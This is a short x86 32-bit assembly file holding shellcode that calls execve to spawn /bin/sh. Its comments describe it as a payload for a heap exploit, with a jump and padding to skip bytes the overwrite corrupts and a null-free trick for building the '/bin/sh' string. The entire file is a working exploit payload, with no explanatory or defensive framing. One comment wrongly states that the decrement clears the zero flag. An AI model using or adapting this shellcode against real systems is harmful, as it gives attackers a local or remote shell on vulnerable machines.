[bits 32]

	; envp = NULL
	push byte 0x01
	pop edx
	dec edx ; this also sets ZF = 0

	; jump and "nops" to get past the overwrite performed by the heap exploit
	jz short +0x13
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx

	; filename = "/bin/sh"
	push byte 0x68 ; "h"
	push word 0x7330 ; "0s"
	pop ebx
	dec ebx ; "/sh"
	push ebx

	push dword 0x6e696230 ; "0bin"
	pop ebx
	dec ebx ; "/bin"
	push ebx

	push esp
	pop ebx

	; argv = { filename, NULL }
	push edx  ; NULL
	push ebx  ; "/bin/sh"
	push esp
	pop ecx

	; syscall execve
	push byte 11
	pop eax
	int 0x80